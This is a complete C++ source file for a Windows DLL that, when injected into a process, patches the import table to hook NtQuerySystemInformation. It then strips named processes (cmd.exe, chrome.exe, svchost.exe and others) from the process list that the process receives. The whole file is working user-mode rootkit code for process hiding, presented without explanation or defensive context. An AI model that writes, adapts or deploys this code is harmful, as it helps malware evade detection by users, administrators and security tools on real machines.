#include "pch.h"
#include <iostream>
#include <string>
#include <vector>
#include <Psapi.h>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS (*NtQuerySystemInformationOriginal)(SYSTEM_INFORMATION_CLASS SIC, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NtQuerySystemInformationOriginal Original = (NtQuerySystemInformationOriginal)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");


bool CompareHide(const wchar_t* processName) {
    // A list of process to hide
    std::vector<std::wstring> HiddenProcesses{ L"notepad.exe", L"cmd.exe", L"chrome.exe", L"Discord.exe", L"svchost.exe"};
    for (std::wstring Process : HiddenProcesses) {
        if (Process.compare(processName) == 0) {
            return true;
        }
    }
    return false;
}

void Hide(PSYSTEM_PROCESS_INFORMATION pThis, PSYSTEM_PROCESS_INFORMATION pNext, PVOID spi) {
    ULONG bytes_to_skip = pNext->NextEntryOffset;
    while (pNext->NextEntryOffset) {
        pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pNext + pNext->NextEntryOffset);
        if (CompareHide(pNext->ImageName.Buffer)) {
            bytes_to_skip += pNext->NextEntryOffset;
        }
        else {
            break;
        }
    }
    pThis->NextEntryOffset = (pNext->NextEntryOffset == 0) ? 0 : pThis->NextEntryOffset + bytes_to_skip;

}

NTSTATUS HookedFunction(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {

    NTSTATUS result;
    PSYSTEM_PROCESS_INFORMATION pNext;
    PSYSTEM_PROCESS_INFORMATION pThis;

    result = Original(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(result)) {
        pThis = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        pNext = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pThis + pThis->NextEntryOffset);
        while (pThis->NextEntryOffset) {
            if (CompareHide(pNext->ImageName.Buffer)) {
                if (pNext->NextEntryOffset == 0) {
                    pThis->NextEntryOffset = 0;
                    break;
                }
                else {
                    Hide(pThis, pNext, SystemInformation);
                }
            }
            pThis = pNext;
            pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pNext + pNext->NextEntryOffset);
        }
    }

    return result;

}

void StartHook() {
    MODULEINFO modInfo{ 0 };
    GetModuleInformation(GetCurrentProcess(), GetModuleHandle(0), &modInfo, sizeof(MODULEINFO));

    BYTE* base = (BYTE*)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER imageDosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS PEHeaders = (PIMAGE_NT_HEADERS)((BYTE*)base + imageDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER imageOptionalHeader = PEHeaders->OptionalHeader;
    PIMAGE_IMPORT_DESCRIPTOR imageImportDescriptors = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)base + imageOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);


    char* dllName = NULL;
    char* funcName = NULL;
    PIMAGE_THUNK_DATA original = NULL, first = NULL;
    PIMAGE_IMPORT_BY_NAME ImageImportByName = NULL;

    for (; imageImportDescriptors->Characteristics; imageImportDescriptors++) {
        dllName = (char*)((BYTE*)base + imageImportDescriptors->Name);
        original = (PIMAGE_THUNK_DATA)((BYTE*)base + imageImportDescriptors->OriginalFirstThunk);
        first = (PIMAGE_THUNK_DATA)((BYTE*)base + imageImportDescriptors->FirstThunk);
        if (!strcmp(dllName, "ntdll.dll")) {
            for (; original->u1.AddressOfData != NULL; original++, first++) {
                ImageImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + original->u1.AddressOfData);
                funcName = (char*)(ImageImportByName->Name);
                if (!strncmp(funcName, "NtQuerySystemInformation", 25)) {
                    DWORD OldProtect = 0;
                    VirtualProtect((void*)&first->u1.Function, 8, PAGE_READWRITE, &OldProtect);
                    first->u1.Function = (DWORD_PTR)HookedFunction;
                    VirtualProtect((void*)&first->u1.Function, 8, OldProtect, NULL);
                }

            }
            break;
        }

    }


}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        StartHook();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

